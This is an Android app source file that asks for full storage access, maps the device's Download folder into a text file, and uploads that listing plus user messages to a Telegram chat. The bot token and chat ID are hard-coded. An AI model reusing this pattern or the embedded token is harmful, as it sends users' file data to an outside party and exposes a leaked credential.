package com.example.myapplication;

import android.Manifest;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.Button;
import android.widget.Toast;
import android.widget.EditText;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import static android.content.pm.PackageManager.PERMISSION_GRANTED;

public class MainActivity extends AppCompatActivity {

    private final String botToken = "7916356795:AAHMkdpGxBG1AI7TGcvsDfCLZcqUm3THYbk";
    private final String chatId = "1585904762";
    private final OkHttpClient client = new OkHttpClient();

    private static final int REQUEST_STORAGE_PERMISSION = 100;
    private static final int REQUEST_MANAGE_ALL_FILES = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Button sendButton = findViewById(R.id.sendButton);
    EditText customMessageInput = findViewById(R.id.customMessageInput);
    Button customMessageButton = findViewById(R.id.customMessageButton);

    sendButton.setOnClickListener(v -> {
        checkStoragePermission();
        sendTelegramMessage("Hello from Android app!");
        File mapFile = generateFileMap();
        if (mapFile != null) {
            sendFileToTelegram(mapFile, "Here is the map of your Download folder:");
        }
    });

    customMessageButton.setOnClickListener(v -> {
        String customMessage = customMessageInput.getText().toString().trim();
        if (!customMessage.isEmpty()) {
            sendTelegramMessage(customMessage);
        } else {
            Toast.makeText(MainActivity.this, "Please enter a message", Toast.LENGTH_SHORT).show();
        }
    });
    }

    private void sendTelegramMessage(String message) {
        String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message;

        Request request = new Request.Builder()
                .url(url)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override public void onResponse(Call call, Response response) {
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Message sent to Telegram", Toast.LENGTH_SHORT).show());
            }
        });
    }

    private void sendFileToTelegram(File file, String caption) {
        String url = "https://api.telegram.org/bot" + botToken + "/sendDocument";

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("document", file.getName(),
                        RequestBody.create(file, MediaType.parse("text/plain")))
                .build();

        Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override public void onResponse(Call call, Response response) {
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "map.txt sent to Telegram", Toast.LENGTH_SHORT).show());
            }
        });
    }

    private File generateFileMap() {
        File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        File outputFile = new File(getExternalFilesDir(null), "map.txt");

        try (FileWriter writer = new FileWriter(outputFile)) {
            listFilesRecursive(downloadDir, writer, "");
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }

        return outputFile;
    }

    private void listFilesRecursive(File dir, FileWriter writer, String indent) throws IOException {
    if (dir == null || !dir.exists()) return;

    File[] files = dir.listFiles();
    if (files != null) {
        for (File file : files) {
            String emoji = file.isDirectory() ? "📁" : "📄";
            String name = file.getName();
            long modified = file.lastModified();
            String modifiedTime = android.text.format.DateFormat.format("yyyy-MM-dd HH:mm:ss", modified).toString();

            writer.write(indent + emoji + " " + name + " (Modified: " + modifiedTime + ")\n");

            if (file.isDirectory()) {
                listFilesRecursive(file, writer, indent + "    ");
            }
        }
    }
}

    private void checkStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11 and above
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQUEST_MANAGE_ALL_FILES);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, REQUEST_MANAGE_ALL_FILES);
                }
            } else {
                Toast.makeText(this, "Full storage access granted", Toast.LENGTH_SHORT).show();
            }
        } else {
            // Android 10 and below
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PERMISSION_GRANTED) {

                ActivityCompat.requestPermissions(this,
                        new String[]{
                                Manifest.permission.READ_EXTERNAL_STORAGE,
                                Manifest.permission.WRITE_EXTERNAL_STORAGE
                        },
                        REQUEST_STORAGE_PERMISSION);
            } else {
                Toast.makeText(this, "Storage permission already granted", Toast.LENGTH_SHORT).show();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_STORAGE_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PERMISSION_GRANTED) {
                Toast.makeText(this, "Storage permission granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Storage permission denied", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
